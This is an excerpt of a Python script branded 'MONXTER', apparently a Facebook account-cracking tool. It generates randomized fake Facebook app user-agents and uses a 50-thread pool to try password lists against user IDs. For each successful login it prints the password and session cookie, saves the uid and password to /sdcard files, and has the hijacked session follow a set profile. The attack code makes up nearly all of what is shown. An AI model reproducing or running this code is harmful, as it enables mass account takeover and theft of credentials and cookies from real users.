...
def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://mbasic.facebook.com/profile.php?id=1311279934', {
...
ha = current.day
today = date.today()
#os.system('xdg-open https://t.me/athra-302')
ugen3=[]
...
---------------------------------------------------
AUTHOR    : MONXTER   
FACEBOOK  : Tʜe'w Moŋxtɘr Insııdə
TYPE TYPE : FREE 
VERSION   : 1.83.0
---------------------------------------------------""")
def linex():
...
def clear():
    os.system('clear')
    #os.system('xdg-open https://youtube.com/@monxter_tricker_brand_here?si=_VhMHV-2KTOWGg2i')
    print(logo)
...
for xd in range(10000):
    ...
    c='vivo 1901 Build/OPR6.6706781.809) [FBAN/FB4A;FBAV/'
    d=random.randrange(118, 375,)
    e='0'
    f=random.randrange(3000, 6000)
    g=random.randrange(20, 100)
    h='FBBV/167089131;FBDM/{density=2.0,width=720,height=1406};FBLC/en_US;FBRV/0;FBCR/Telenor;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.katana;FBDV/vivo 1901;FBSV/11;FBOP/1;FBCA/arm64-v8a'
    ua=f'{a} {b};{c}{d}.{e}.{f} {h}'
    ugen.append(ua)
...
def riddu():
    ...
    with ThreadPool(max_workers=50) as morshed:
        ...
        print(f' \033[1;91m[\033[1;97m•\033[1;91m]\033[1;94m TOOL OWNER \033[1;97m: \033[1;96m MONXTER')
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\r\r\033[1;32m[MONXTER-OK💚] ' +uid+ ' | ' +ps+    '  \n[‎‎🌺]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
                cek_apk(session,coki)
                open('/sdcard/MONXTER-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                print('\r\r\33[1;31m [MONXTER-CP💔] ' +uid+ ' | ' +ps+           '  \33[0;97m')
                open('/sdcard/MONXTER-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\r%s {x}[{xr}MONXTER {x}][%s|%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
        sys.stdout.flush()
    except:
        pass
